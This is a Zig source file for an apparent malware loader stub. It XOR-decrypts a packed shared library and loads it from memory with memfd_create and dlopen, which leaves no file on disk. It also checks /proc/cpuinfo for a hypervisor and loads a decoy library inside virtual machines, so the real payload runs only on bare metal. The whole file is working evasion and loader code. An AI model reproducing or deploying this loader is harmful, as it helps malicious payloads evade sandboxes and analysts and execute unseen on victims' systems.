const std = @import("std");
const c = @cImport({
    @cDefine("_GNU_SOURCE", {});
    @cInclude("dlfcn.h");
    @cInclude("stdio.h");
    @cInclude("unistd.h");
});

const max_file_size = 10 * 1024 * 1024;
const SYS_memfd_create = std.os.linux.SYS.memfd_create;

fn memfd_create(name: [*:0]const u8, flags: c_uint) c_int {
    return @intCast(std.os.linux.syscall2(SYS_memfd_create, @intFromPtr(name), @intCast(flags)));
}

fn is_virtualized() bool {
    const file = c.fopen("/proc/cpuinfo", "r") orelse return false;
    defer _ = c.fclose(file);
    var buf: [4096]u8 = undefined;
    const n = c.fread(&buf, 1, buf.len, file);
    return std.mem.indexOf(u8, buf[0..n], "hypervisor") != null;
}

fn load_so_from_memory(data: []u8) !?*anyopaque {
    const fd = memfd_create("", 0);
    if (fd < 0) return error.MemfdFailed;
    defer _ = c.close(fd);

    var written: usize = 0;
    while (written < data.len) {
        const n = c.write(fd, data.ptr + written, data.len - written);
        if (n < 0) return error.WriteFailed;
        written += @intCast(n);
    }

    var fd_path: [64]u8 = undefined;
    const path = try std.fmt.bufPrintZ(&fd_path, "/proc/self/fd/{d}", .{fd});
    return c.dlopen(path.ptr, c.RTLD_NOW);
}

fn decrypt_and_load(allocator: std.mem.Allocator, path: []const u8, key: u8) !?*anyopaque {
    const file = try std.fs.cwd().openFile(path, .{});
    defer file.close();

    const data = try file.readToEndAlloc(allocator, max_file_size);
    defer allocator.free(data);

    for (data, 0..) |*byte, i| byte.* ^= @truncate(key +% i);

    return load_so_from_memory(data);
}

pub fn main() !void {
    const allocator = std.heap.page_allocator;
    const xor_key: u8 = 0x42;

    const virtualized = is_virtualized();
    if (virtualized) {
        std.debug.print("[STUB] VM detected - loading decoy\n", .{});
    } else {
        std.debug.print("[STUB] Bare metal - loading payload\n", .{});
    }

    const packed_path = if (virtualized) "decoy.so.packed" else "preload.so.packed";
    const handle = try decrypt_and_load(allocator, packed_path, xor_key);

    if (handle == null) {
        std.debug.print("dlopen failed: {s}\n", .{c.dlerror()});
        return error.DlopenFailed;
    }

    std.debug.print("Loaded successfully\n", .{});
}
